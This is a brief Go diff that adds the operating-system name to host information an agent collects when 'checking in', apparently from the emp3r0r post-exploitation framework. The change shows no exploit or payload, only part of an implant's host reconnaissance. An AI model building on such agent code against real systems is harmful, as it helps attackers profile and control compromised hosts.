@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"strings"
 	"time"
 
@@ -72,6 +73,7 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	log.Println("Collecting system info for checking in")
 	var info emp3r0r_data.AgentSystemInfo
 	osinfo := GetOSInfo()
+	info.GOOS = runtime.GOOS
 
 	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
